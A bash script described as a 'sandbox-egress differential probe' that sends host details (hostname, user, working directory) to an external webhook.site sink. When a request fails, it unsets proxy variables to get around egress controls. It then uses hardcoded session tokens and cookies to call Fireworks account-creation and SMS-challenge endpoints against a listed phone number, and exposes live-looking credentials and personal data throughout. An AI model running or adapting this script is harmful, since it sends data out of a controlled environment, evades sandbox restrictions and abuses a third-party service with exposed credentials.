#!/bin/bash
# i85863 - sandbox-egress differential probe: GetOAuthArguments / CreateAccount / SendSmsChallenge
SINK="https://webhook.site/200a9980-d8af-4e7f-b54d-cf1eaef003cf/i85863"
IDT=eyJraWQiOiJabldGSFFVcUlsUnJHL0J5dWtLQlZZdDU4ZGlGbWgrakZXbjFJYXpObEFNPSIsImFsZyI6IlJTMjU2In0.eyJhdF9oYXNoIjoiT0NPbzRfYzZWdFpuVlRJakpmN1NDUSIsInN1YiI6Ijc4NTFmM2QwLTkwNTEtNzBhYi1jZWEzLThkOTZiYjM0MjdjOCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhbXIiOlsicHdkIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb20vdXMtd2VzdC0yX2ZlQVdKbDJHZCIsImNvZ25pdG86dXNlcm5hbWUiOiI3ODUxZjNkMC05MDUxLTcwYWItY2VhMy04ZDk2YmIzNDI3YzgiLCJmaXJld29ya3NfYWNjb3VudCI6ImR1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2NyIsIm5vbmNlIjoiVGR5ZHlsRkE1c1V1VXpTUU5lRUZrQSIsImZpcmV3b3Jrc191c2VyIjoiZHVsYW1vcml0eitpODEyNjg3MDIzYmI0OTliZGFAZ21haWwuY29tIiwib3JpZ2luX2p0aSI6ImQ5Njk2NGY3LWFjMDktNGMwZS04YjQyLTc2ZGU2NjExMjE1NCIsImF1ZCI6InN1ZWFzN3Byc2ZyZHAxNm5hbnRiZXFjanYiLCJhY3IiOiJ1cm46Y29nbml0bzpsb2E6MSIsImV2ZW50X2lkIjoiNzA5ZGRhMTktODRhMi00Njc5LWFlMjktOWRmMjU3NjVhOGI5IiwidG9rZW5fdXNlIjoiaWQiLCJmaXJld29ya3NfZ3JvdXAiOiIiLCJhdXRoX3RpbWUiOjE3OTQ3MTExMzQsImV4cCI6MTc5NDcxNDczNCwiaWF0IjoxNzk0NzExMTM0LCJqdGkiOiJiOTY5ZDJkNC1lYzk5LTRmYTItYjVjNy01YzY4ZDgzM2NlMTgiLCJlbWFpbCI6ImR1bGFtb3JpdHoraTgxMjY4NzAyM2JiNDk5YmRhQGdtYWlsLmNvbSJ9.ID7cziMahloaqOFjlE9gHiGvRj2tArS_wKlA7KlstqI9gnTdwHs3-IYtOcyo4Ak3Zizi6AEeMS7NP4LCYXVMjzyyVlOJV_sR3SJ55tWNJnBfHUPmf-AS6GSJWrRpvstrOQuix0tXFMA0Exfg-PhiHA_RuT7BOOV_DxclbmxSYc-cK4Jojcl2DzCINZ5rx12LkkipfNFfoFBV3L-S0_OpLpcb-VCpUxtWP_rW9q5DruCzvrzMjzF_rApo01wT80PEhNrKB4DZPL754P5CqYhouuUg4E4vo0ePdAhbZkloAe6IFPfUo8H6c7RYcrQn-7YzmI4sFB_My1hgPcADuKUMdA
PHONE="+46731299509"
ACC="dulamoritz-i812687023bb499bda-a61f67"
AID="7ebf9512d93c1a5222c936a38d67e0d7be69850600"
CK="auth_v2_id_token=eyJraWQiOiJabldGSFFVcUlsUnJHL0J5dWtLQlZZdDU4ZGlGbWgrakZXbjFJYXpObEFNPSIsImFsZyI6IlJTMjU2In0.eyJhdF9oYXNoIjoiT0NPbzRfYzZWdFpuVlRJakpmN1NDUSIsInN1YiI6Ijc4NTFmM2QwLTkwNTEtNzBhYi1jZWEzLThkOTZiYjM0MjdjOCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhbXIiOlsicHdkIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb20vdXMtd2VzdC0yX2ZlQVdKbDJHZCIsImNvZ25pdG86dXNlcm5hbWUiOiI3ODUxZjNkMC05MDUxLTcwYWItY2VhMy04ZDk2YmIzNDI3YzgiLCJmaXJld29ya3NfYWNjb3VudCI6ImR1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2NyIsIm5vbmNlIjoiVGR5ZHlsRkE1c1V1VXpTUU5lRUZrQSIsImZpcmV3b3Jrc191c2VyIjoiZHVsYW1vcml0eitpODEyNjg3MDIzYmI0OTliZGFAZ21haWwuY29tIiwib3JpZ2luX2p0aSI6ImQ5Njk2NGY3LWFjMDktNGMwZS04YjQyLTc2ZGU2NjExMjE1NCIsImF1ZCI6InN1ZWFzN3Byc2ZyZHAxNm5hbnRiZXFjanYiLCJhY3IiOiJ1cm46Y29nbml0bzpsb2E6MSIsImV2ZW50X2lkIjoiNzA5ZGRhMTktODRhMi00Njc5LWFlMjktOWRmMjU3NjVhOGI5IiwidG9rZW5fdXNlIjoiaWQiLCJmaXJld29ya3NfZ3JvdXAiOiIiLCJhdXRoX3RpbWUiOjE3OTQ3MTExMzQsImV4cCI6MTc5NDcxNDczNCwiaWF0IjoxNzk0NzExMTM0LCJqdGkiOiJiOTY5ZDJkNC1lYzk5LTRmYTItYjVjNy01YzY4ZDgzM2NlMTgiLCJlbWFpbCI6ImR1bGFtb3JpdHoraTgxMjY4NzAyM2JiNDk5YmRhQGdtYWlsLmNvbSJ9.ID7cziMahloaqOFjlE9gHiGvRj2tArS_wKlA7KlstqI9gnTdwHs3-IYtOcyo4Ak3Zizi6AEeMS7NP4LCYXVMjzyyVlOJV_sR3SJ55tWNJnBfHUPmf-AS6GSJWrRpvstrOQuix0tXFMA0Exfg-PhiHA_RuT7BOOV_DxclbmxSYc-cK4Jojcl2DzCINZ5rx12LkkipfNFfoFBV3L-S0_OpLpcb-VCpUxtWP_rW9q5DruCzvrzMjzF_rApo01wT80PEhNrKB4DZPL754P5CqYhouuUg4E4vo0ePdAhbZkloAe6IFPfUo8H6c7RYcrQn-7YzmI4sFB_My1hgPcADuKUMdA; auth_v2_access_token=eyJraWQiOiJqVHZhbnpjbFVoUFMrMkxER1VUQ0JYTmJWS2IvZ2llWW05elljM093ejdVPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI3ODUxZjNkMC05MDUxLTcwYWItY2VhMy04ZDk2YmIzNDI3YzgiLCJhbXIiOlsicHdkIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb20vdXMtd2VzdC0yX2ZlQVdKbDJHZCIsInZlcnNpb24iOjIsImNsaWVudF9pZCI6InN1ZWFzN3Byc2ZyZHAxNm5hbnRiZXFjanYiLCJvcmlnaW5fanRpIjoiZDk2OTY0ZjctYWMwOS00YzBlLThiNDItNzZkZTY2MTEyMTU0IiwiYWNyIjoidXJuOmNvZ25pdG86bG9hOjEiLCJldmVudF9pZCI6IjcwOWRkYTE5LTg0YTItNDY3OS1hZTI5LTlkZjI1NzY1YThiOSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoib3BlbmlkIHByb2ZpbGUgZW1haWwiLCJhdXRoX3RpbWUiOjE3OTQ3MTExMzQsImV4cCI6MTc5NDcxNDczNCwiaWF0IjoxNzk0NzExMTM0LCJqdGkiOiI0NjZhMDc5MS01NzIyLTRkNzAtOTUzYy1mZDdjNDQ2NzkyNzEiLCJ1c2VybmFtZSI6Ijc4NTFmM2QwLTkwNTEtNzBhYi1jZWEzLThkOTZiYjM0MjdjOCJ9.lNF3gHiVNUCNYRcmmGe0niZ_GKNjs2hFNcSj_wkf_dgfLp-rRVKLFJ_yhA8PtYNsI_vxlZoFjD1M_ss0K6waDap1GjWdk2tnVC7jAABg26X4qi715gCbCyjMGwgFjKrj1pKHdParyEHsJgVO37wreb8NcTr8Qi3AjCtSSDWIOvTtD5zFq-n3TuoIDlwaLNrMWDaWp0bkkJ1EDYnq3Xllzd6XgywoowtLycj9RBKZZs89L7KuYLB8Ruzi1WLgwZUNHs8EQSNO1Lk_I5y1oAC4E_Fn_Zu6h7h5BVFP1MKzBwGED6U2ajnlcot3H_C7Z6G-R2xTEx1RncuIx6JdVe8BjA; auth_v2_refresh_token=eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.tIAnDvcRlU4heNzIKkT0aPhZJTqazcMzvauebcZWtLZzaogz5rm8EDkSM9XErmSbqoKL5oQE1h0hptBlS9TEQ9HzeJCa_KgeRdDhM23ytsCwrgkE04wmbcQ_NQC7m-CbCZ2klvfiDJDqgggYnxkHU7Jq9KUDedeF4-6L-jCtL2LHuZyREkTBBsGdiS9qLjl0p3M3bXwqqkdOB1gQ806iW2pbfYP0sToeEKBFXFkc1PtAu5uibzwXRBZoJlTpwJ287mcIkOQOyG4E7K9VUWoMmUlSEGGLUi4wbbHlqX2XZxauj9oNkuxXKiYq8kheIyAQTtc9IFAX66jzfKl5u3xZ8A.mYYyenUS2vuNpW6J.E5mkg6vihN080V9OxpwYAi55laOnNgvq9x0Dss9RGTNfNRrV5iSsCgYRM7I17zUaT07QiCHSeNQZdtKoDJWmUl8nEUBNnXvu4FSPF3TpaKfJ9Bh6EQLjIh3DtI9MmOCb_-VwdixSnpOjVDERkNwgfAK_zPqQTfmyeLUrqbBtVTEYSZEvD49X6dAr4ZIbmS2Xj8VZuCAXiazepv7JUj8Mizmvhl9GReBfCWyqgZwScZyrvYGRiynEIwC-7jsUIwcP5ousGzsZK5EKjZBZKIXm8wsvEpyWEM2teqg2_G-iD79iDYclRkLwHZ7uFlqJnc_kJc5r3cnYpBBv4rFl3IbEZbXyV50QiKRxGATx5hphpuDeV1HXCZFNfeHCKQrm-8vS7CokGTc_EcuoW2mXXO2lUu4YHujvxYDFaAA9JFnLeK3lB-cg_2DJCJ395gspIZvyc8TtnsjixXpEJGSRFQNn2zBI6nUQKtg6Ro6ZbaiYLG9wQ5RQqLtlwtBB44_XoZAAvDZdLlO8GssyGeRgON8EmDFEfdMHTDtvnisaVS_7dnNwxdRhzk-IJm6WyRjOMBIKK2DEXYmOfmpo24DJwE05pc6kgq79c4y9O1ynQ2lwVXDdo7FHYeckrVu3QLWucLl_JyjACYS5vKBl-aXFxADC4Q5Sm2qkmXlGkRvq0V2uenLS2lXWKsnZ8-ijBzDLp9GyjgQ3h8HnxoSlum2s4fUV1Zb4PHfPRR9FdskVaf0tRsbp7BePn8CPEf4_SRXgpeeuKH1qAjRHNeg2EWQwwW6iv0O2XOk7cHX9_mXxhAnbEQBfycfRCgqTZO_s-kp_MAB6gD4ERXMBHerU5IK2gMGfLRt12GjBSptH8ROGNa8J4F9WhQgc5-Rg-YBKa3mHtIral442a--VoBsMs2YXaAOWtHD4ryACWWWfoWdfaNBcI3oYBESDLJVt_ZSfLhJedD7tdWsSHCNnQyl2lIF5chDI6Um643JnHyMnM6D9eTEa1I62DDOftVb2g6sfXjQb5PTdZWrKooLaqTHoLKqAsC8Uq_4h1pkz9TQztHrhp99uk6DH06JPPOCGJC-JtgPpDNhYcVgyO9TxpRignVwGCORuN4LeqzV4MgcknfMReVtkhzOiP0j_dYFJmzeaWisDv7tg3b0zRFfdydPfxHxSV1k9zsTRIaOQrzA8GkQpUUI0w2aB9IHZpKZpNgKvY89OVu21Zh41iNPhpho3-Np8WC8Kmx0gi9z2OfEcYCgLBhAr-NeQXOnhas4zBTqbuLxnTfIuct9sqxSa1VSuFURqRc66W0ghiK99GQbthKHo08Zjrz1tZTvQ_U_iIcGaVzKB1hZ5F9oqj3rMRe9HnsgEpJA_vWULKewm7meKI9_VgrVhEgvUGsK3m_FC77bTqgXiBYY.9z1TyBQ1OYg0QyJ8TFDkzA; auth_v2_user_context=%7B%22accountID%22%3A%22%22%2C%22email%22%3A%22dulamoritz%2Bi812687023bb499bda%40gmail.com%22%2C%22hasAccount%22%3Afalse%2C%22accountType%22%3A0%2C%22accountState%22%3A0%2C%22impersonating%22%3Afalse%7D"
OA_B64="AAAAAAA="
CA_B64="AAAAAIcKNBIJaTg1ODYzc2J4SidkdWxhbW9yaXR6K2k4MTI2ODcwMjNiYjQ5OWJkYUBnbWFpbC5jb20SJGR1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2NyIpIidkdWxhbW9yaXR6K2k4MTI2ODcwMjNiYjQ5OWJkYUBnbWFpbC5jb20="

post(){ u="$SINK-$1"; d="$2"; curl -sS -m 6 -o /dev/null -X POST "$u" -H 'content-type: text/plain' --data-binary "$d" 2>/dev/null || env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY -u all_proxy curl -sS -m 6 -o /dev/null -X POST "$u" -H 'content-type: text/plain' --data-binary "$d" 2>/dev/null; }
hdr(){ tr -d '\r' < "$1" 2>/dev/null; }
gs(){ v=$(hdr "$1" | grep -i '^grpc-status:' | head -1 | cut -d' ' -f2); if [ -n "$v" ]; then echo "$v"; elif [ -s "$2" ]; then echo '0(no-trailer)'; else echo 'ABSENT'; fi; }
gm(){ hdr "$1" | grep -i '^grpc-message:' | head -1 | cut -d' ' -f2-; }
gd(){ hdr "$1" | grep -i '^grpc-status-details-bin:' | head -1 | cut -d' ' -f2-; }
b64(){ if [ -s "$1" ]; then base64 -w0 < "$1"; fi; }

post start "host=$(hostname) utc=$(date -u +%FT%TZ) cwd=$(pwd) who=$(id -un 2>/dev/null) curl=$(curl --version 2>/dev/null | head -1) py=$(command -v python3 || echo none)"

gcall(){ # gcall <path> <bodyfile> <tagprefix> [auth]
  pth=$1; bf=$2; pre=$3; au=$4; i=0
  while [ $i -lt 2 ]; do
    if [ "$au" = "auth" ]; then
      curl -sS --http2 -m 20 -D /tmp/$pre.h -o /tmp/$pre.r -X POST "https://gateway.fireworks.ai$pth" \
        -H 'content-type: application/grpc' -H 'te: trailers' -H "Authorization: Bearer $IDT" \
        --data-binary @"$bf" >/tmp/$pre.err 2>&1
    else
      curl -sS --http2 -m 20 -D /tmp/$pre.h -o /tmp/$pre.r -X POST "https://gateway.fireworks.ai$pth" \
        -H 'content-type: application/grpc' -H 'te: trailers' \
        --data-binary @"$bf" >/tmp/$pre.err 2>&1
    fi
    if ! grep -qi 'CONNECT aborted\|Could not resolve\|Failed to connect' /tmp/$pre.err; then break; fi
    i=$((i+1)); sleep $i
  done
}

# 1) GetOAuthArguments (trusted-egress positive control)
printf '%s' "$OA_B64" | base64 -d > /tmp/i8oa.b
gcall /gateway.Gateway/GetOAuthArguments /tmp/i8oa.b i8oa ""
post oa "gs=$(gs /tmp/i8oa.h /tmp/i8oa.r)|gm=$(gm /tmp/i8oa.h)|body_b64=$(b64 /tmp/i8oa.r)|err=$(head -c 160 /tmp/i8oa.err | tr '\n' ' ')"

# 2) CreateAccount (gmail-class identity)
printf '%s' "$CA_B64" | base64 -d > /tmp/i8ca.b
gcall /gateway.Gateway/CreateAccount /tmp/i8ca.b i8ca auth
CA_GS=$(gs /tmp/i8ca.h /tmp/i8ca.r); CA_DET=$(gd /tmp/i8ca.h)
post ca "gs=$CA_GS|gm=$(gm /tmp/i8ca.h)|details=$CA_DET|body_b64=$(b64 /tmp/i8ca.r)|err=$(head -c 160 /tmp/i8ca.err | tr '\n' ' ')"

# 3) challenge id: from CreateAccount grpc-status-details-bin metadata
CH=""; EXP=""
if [ -n "$CA_DET" ]; then
  printf '%s' "$CA_DET" | base64 -d 2>/dev/null | tr -c '[:print:]' '\n' > /tmp/i8det.txt
  CH=$(awk '/^challenge_id$/{f=1;next} f&&NF{print;exit}' /tmp/i8det.txt)
  EXP=$(awk '/^expires_at$/{f=1;next} f&&NF{print;exit}' /tmp/i8det.txt)
fi
post cid "challenge=$CH|expires=$EXP"

# 3b) fallback: app /onboarding Server Action
if [ -z "$CH" ]; then
  BODY='[{"accountId":"'"$ACC"'","companyName":"Pipeline Co","firstName":"Test","lastName":"User","agreeToTerms":true,"step":"profile","goals":[0],"useCases":[0],"otherGoal":"","otherUseCases":"","nexusUseCases":[],"nexusOtherUseCase":""},false,"","","",false]'
  curl -sS -m 18 -D /tmp/i8on.h -o /tmp/i8on.r -X POST https://app.fireworks.ai/onboarding \
    -H 'content-type: text/plain;charset=UTF-8' -H "Next-Action: $AID" -H 'Accept: text/x-component' \
    -H 'Origin: https://app.fireworks.ai' -H 'Referer: https://app.fireworks.ai/onboarding' \
    -H "Cookie: $CK" --data-binary "$BODY" >/tmp/i8on.err 2>&1
  CH=$(sed -n 's/.*"challengeId":"\([^"]*\)".*/\1/p' /tmp/i8on.r | head -1)
  EXP=$(sed -n 's/.*"expiresAt":"\([^"]*\)".*/\1/p' /tmp/i8on.r | head -1)
  post onb "http=$(head -1 /tmp/i8on.h | tr -d '\r')|challenge=$CH|expires=$EXP|bytes=$(wc -c </tmp/i8on.r)|head=$(head -c 260 /tmp/i8on.r | tr '\n' ' ')"
fi
CH="${FORCE_CH:-$CH}"; [ -z "$CH" ] && CH="x0000000000000000000000000"

# 4) SendSmsChallenge (#1 challenge_id, #2 phone_number)
if [ -n "$CH" ]; then
  python3 -c 'import sys; c=sys.argv[1].encode(); p=sys.argv[2].encode(); b=b"\x0a"+bytes([len(c)])+c+b"\x12"+bytes([len(p)])+p; sys.stdout.buffer.write(b"\x00\x00\x00\x00"+len(b).to_bytes(4,"big")+b)' "$CH" "$PHONE" > /tmp/i8sms.b
  t0=$(date +%s)
  gcall /gateway.Gateway/SendSmsChallenge /tmp/i8sms.b i8sms auth
  post sms "gs=$(gs /tmp/i8sms.h /tmp/i8sms.r)|gm=$(gm /tmp/i8sms.h)|details=$(gd /tmp/i8sms.h)|reqbytes=$(wc -c </tmp/i8sms.b)|secs=$(( $(date +%s) - t0 ))|err=$(head -c 160 /tmp/i8sms.err | tr '\n' ' ')"
  # 4b) VerifySmsChallenge with dummy code
  python3 -c 'import sys; c=sys.argv[1].encode(); p=b"000000"; b=b"\x0a"+bytes([len(c)])+c+b"\x12"+bytes([len(p)])+p; sys.stdout.buffer.write(b"\x00\x00\x00\x00"+len(b).to_bytes(4,"big")+b)' "$CH" > /tmp/i8ver.b
  gcall /gateway.Gateway/VerifySmsChallenge /tmp/i8ver.b i8ver auth
  post ver "gs=$(gs /tmp/i8ver.h /tmp/i8ver.r)|gm=$(gm /tmp/i8ver.h)|details=$(gd /tmp/i8ver.h)"
else
  post sms "SKIPPED no-challenge"
fi

post done "utc=$(date -u +%FT%TZ)"
echo "I85863RESULT host=$(hostname) oa=$(gs /tmp/i8oa.h /tmp/i8oa.r) ca=$(gs /tmp/i8ca.h /tmp/i8ca.r) cid=$CH sms=$(gs /tmp/i8sms.h /tmp/i8sms.r 2>/dev/null) smsgm=$(gm /tmp/i8sms.h 2>/dev/null)"
